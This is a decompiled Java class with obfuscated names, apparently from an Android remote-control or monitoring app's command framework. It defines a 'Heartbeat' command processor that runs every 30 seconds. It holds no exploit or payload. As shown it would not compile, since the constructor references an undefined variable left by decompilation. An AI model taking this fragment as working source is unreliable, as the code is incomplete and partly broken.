package com.vvt.remotecommand.processor.misc;

import com.vvt.remotecommand.processor.RemoteCommandProcessor.QueueCategory;
import com.vvt.remotecommand.processor.b;
import com.vvt.remotecontrol.RemoteFunction;
import com.vvt.remotecontrol.a;

public class j
  extends b
{
  public j(a parama)
  {
    super(parama, true, localRemoteFunction);
  }
  
  public RemoteCommandProcessor.QueueCategory d()
  {
    return RemoteCommandProcessor.QueueCategory.MAIN;
  }
  
  public String e()
  {
    return "Heartbeat";
  }
  
  public boolean f()
  {
    return true;
  }
  
  public long g()
  {
    return 30000L;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecommand/processor/misc/j.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */